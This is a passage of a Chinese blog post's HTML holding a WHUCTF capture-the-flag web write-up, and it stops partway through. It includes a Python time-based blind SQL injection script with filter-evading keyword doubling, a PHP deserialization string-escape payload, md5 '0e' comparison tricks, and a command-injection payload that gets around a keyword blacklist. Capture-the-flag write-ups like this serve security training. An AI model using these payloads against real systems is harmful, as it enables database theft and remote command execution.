@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>WHUCTF web wp - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup">
+  
+
+  
+    <meta name="description" content="武汉大学萌新赛的题目，做做吧！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">WHUCTF web wp</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/">
+      WHUCTF web wp
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年5月23日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：2.2k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：12分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/" class="leancloud_visitors" data-flag-title="WHUCTF web wp">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>武汉大学萌新赛的题目，做做吧！</p>
+<a id="more"></a>
+
+<h2 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h2><p>有sql语句回显，很友好了，exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://218.197.154.9:10011/login.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">	<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	f1=flag</span><br><span class="line">	top=<span class="number">127</span></span><br><span class="line">	low=<span class="number">33</span></span><br><span class="line">	<span class="keyword">while</span> low&lt;=top:</span><br><span class="line">		mid=(top+low)//<span class="number">2</span></span><br><span class="line">		print(mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line">		data1=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r1=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">		<span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">			flag=flag+chr(mid)</span><br><span class="line">			print(chr(mid))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				r=requests.post(url,data=data,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">			<span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">				low=mid+<span class="number">1</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				top=mid<span class="number">-1</span></span><br><span class="line">	<span class="keyword">if</span> flag==f1:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>爆数据库：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment"># easy_sql1</span></span><br></pre></td></tr></table></figure>
+
+<p>爆表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment"># f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br></pre></td></tr></table></figure>
+
+<p>爆字段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#x27;f1ag_y0u_wi1l_n3ver_kn0w&#x27; ),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment"># f111114g</span></span><br></pre></td></tr></table></figure>
+
+<p>爆内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">		<span class="string">&#x27;user&#x27;</span>:<span class="string">&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(f111114g) frfromom easy_sql1.f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;</span>.format(str(i),str(mid)),</span><br><span class="line">		<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment"># WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">&#x27;str2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;num&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1st ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;会代码审计嘛23333&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;2nd ok&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can u give me the right str???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no!!!!!!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;is str1 numeric??????&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/x/&#x27;</span>, <span class="string">&#x27;yy&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">&quot;123456&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>第一层很好绕，直接%0a就行</p>
+<p>第二层要求两个数md5不相等，经过strtr函数替换，该函数相当于生成一个替换字典，按照字典键值替换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strtr($md5_1, <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>)</span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="comment">// p-&gt;1 g-&gt;3 n-&gt;4 b-&gt;5</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以写一个脚本(不是我写的)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">100000000</span>; $i++) &#123;</span><br><span class="line">    $md5 = strtr(md5($i), <span class="string">&#x27;pggnb&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>, $md5)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $i . <span class="string">&quot; &quot;</span> . md5($i) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        $count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($count == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 11230178 0e732639146814822596b49bb6939b97</span></span><br><span class="line"><span class="comment">// 20493141 0e343359461627b56649445b748588b8</span></span><br><span class="line"><span class="comment">// 替换后0e后面均为纯数字</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一点相等利用php认为0e开头且后面是纯数字的都相等的特性</p>
+<p>最后一关是反序列化字符逃逸，正常序列化的结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;i:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;aaaaa&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>确定要添加的内容,长度为20</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>列方程，n为x字符数量，y为其他字符</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n+y+<span class="number">20</span>=<span class="number">2</span>n+y</span><br></pre></td></tr></table></figure>
+
+<p>解得n=20，故构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">&quot;;i:1;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200523203712.png" style="zoom:67%;">
+
+<p>查看源码得到flag</p>
+<h2 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h2><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no space!&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;</span>, $ip))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;cat&#x27;t read flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不知道为啥curl，echo都用不了，payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=||a=ca;b=t;<span class="variable">$a</span><span class="variable">$b</span><span class="variable">$IFS</span>`ls`</span><br></pre></td></tr></table></figure>
+
+<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>脑洞题，扫目录有：<code>info.php</code>,phpinfo 开了一大堆扩展，立马想到了phpinfo包含临时文件getshell</p>
+<p>找了半天没没找到包含点，最后发现</p>
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200525135648.png" style="zoom:80%;">
+
+<p>就很奇怪，直接php://filter就能读flag，奇怪</p>
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200525135923.png" style="zoom:80%;">
+
+<h2 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h2><p>我太菜了，抓包可以看到</p>
+<img src="/2020/05/23/%E6%AF%94%E8%B5%9B/2020/WHUCTF-web-wp/TIM截图20200525150148.png" style="zoom: 80%;">
+
+<p>html是这样写的：</p>
